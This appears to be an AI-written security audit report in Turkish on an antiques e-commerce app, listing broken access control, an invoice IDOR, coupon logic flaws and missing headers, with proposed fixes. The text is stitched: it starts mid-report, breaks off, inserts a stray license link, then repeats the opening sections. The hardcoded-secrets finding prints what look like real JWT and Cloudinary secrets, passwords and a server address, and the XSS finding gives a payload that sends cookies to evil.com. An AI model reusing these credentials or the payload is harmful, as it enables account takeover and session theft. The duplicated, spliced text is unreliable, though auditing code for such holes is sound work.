- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key:
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
